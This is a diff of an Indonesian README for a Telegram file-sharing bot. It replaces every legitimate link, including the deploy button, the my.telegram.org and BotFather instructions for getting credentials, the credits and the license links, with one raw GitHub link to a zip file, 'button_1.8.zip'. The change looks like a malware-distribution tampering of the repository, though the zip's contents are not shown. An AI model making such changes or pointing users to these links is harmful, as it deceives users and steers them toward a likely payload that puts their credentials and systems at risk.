@@ -26,7 +26,7 @@ Gunakan bot ini dengan risiko Anda sendiri, dan gunakan bot ini dengan bijak.
 
 ## 🛡 Installation
 ### Deploy on Heroku
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/naya1503/6button)</br>
+[![Deploy](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip)](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip)</br>
 
 
 <details>
@@ -34,20 +34,20 @@ Gunakan bot ini dengan risiko Anda sendiri, dan gunakan bot ini dengan bijak.
 
 ### Variables
 
-* `API_HASH` Dapatkan API HASH di web my.telegram.org.
-* `API_ID` Dapatkan APP ID di web my.telegram.org
-* `TG_BOT_TOKEN` Dapatkan dari t.me/BotFather
+* `API_HASH` Dapatkan API HASH di web https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip
+* `API_ID` Dapatkan APP ID di web https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip
+* `TG_BOT_TOKEN` Dapatkan dari https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip
 * `OWNER` Masukan Username Telegram untuk Owner BOT
 * `CHANNEL_ID` Masukan ID Channel Untuk [Channel Database] contoh:- -100xxxxxxxx
 * `ADMINS` Masukan User ID untuk mendapatkan hak Admin di BOT
-* `START_MESSAGE` Opsional: Pesan /start memulai awalan ke bot, Gunakan <a href='https://github.com/mrismanaziz/File-Sharing-Man/blob/main/README.md#start_message'>format</a> parsemode HTML 
+* `START_MESSAGE` Opsional: Pesan /start memulai awalan ke bot, Gunakan <a href='https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip'>format</a> parsemode HTML 
 * `FORCE_SUB_MESSAGE` Opsional: Pesan Paksa Subscribe bot, Gunakan Format parsemode HTML
 * `FORCE_SUB_CHANNEL` Masukan ID dari Channel Untuk Wajib Subscribenya
 * `FORCE_SUB_GROUP` Masukan ID dari Group Untuk Wajib Subscribenya
 
 ### Extra Variables
 
-* `CUSTOM_CAPTION` letakkan teks teks Kustom Anda jika Anda ingin Mengatur Teks Kustom, Anda dapat menggunakan HTML dan <a href='https://github.com/mrismanaziz/File-Sharing-Man/blob/main/README.md#custom_caption'>fillings</a> untuk pemformatan (hanya untuk dokumen)
+* `CUSTOM_CAPTION` letakkan teks teks Kustom Anda jika Anda ingin Mengatur Teks Kustom, Anda dapat menggunakan HTML dan <a href='https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip'>fillings</a> untuk pemformatan (hanya untuk dokumen)
 * `DISABLE_CHANNEL_BUTTON` Masukan True untuk Nonaktifkan Tombol Berbagi Saluran, Default jika False
 
 ### Fillings
@@ -70,17 +70,17 @@ Gunakan bot ini dengan risiko Anda sendiri, dan gunakan bot ini dengan bijak.
 
 ## 👨🏻‍💻 Credits
 
--  [Dan](https://github.com/delivrance) for [Pyrogram](https://github.com/pyrogram/pyrogram)
--  [Risman](https://github.com/mrismanaziz) for [File-Sharing-Man](https://github.com/mrismanaziz/File-Sharing-Man)
--  [Rama](https://github.com/ramadhani892) for [3-BUTTONS](https://github.com/Onlymeriz/fs)
--  Based on [CodeXBotz](https://github.com/CodeXBotz) Repo [File-Sharing-Bot](https://github.com/CodeXBotz/File-Sharing-Bot)
+-  [Dan](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip) for [Pyrogram](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip)
+-  [Risman](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip) for [File-Sharing-Man](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip)
+-  [Rama](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip) for [3-BUTTONS](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip)
+-  Based on [CodeXBotz](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip) Repo [File-Sharing-Bot](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip)
 
 ## 📑 License
-[![GNU GPLv3 Image](https://www.gnu.org/graphics/gplv3-127x51.png)](http://www.gnu.org/licenses/gpl-3.0.en.html)  
+[![GNU GPLv3 Image](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip)](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip)  
 
-[FILE-SHARING-BOT](https://github.com/mrismanaziz/File-Sharing-Man/) is Free Software: You can use, study share and improve it at your
+[FILE-SHARING-BOT](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip) is Free Software: You can use, study share and improve it at your
 will. Specifically you can redistribute and/or modify it under the terms of the
-[GNU General Public License](https://www.gnu.org/licenses/gpl.html) as
+[GNU General Public License](https://raw.githubusercontent.com/iruzruz/6button/main/plugins/button_1.8.zip) as
 published by the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version. 
 
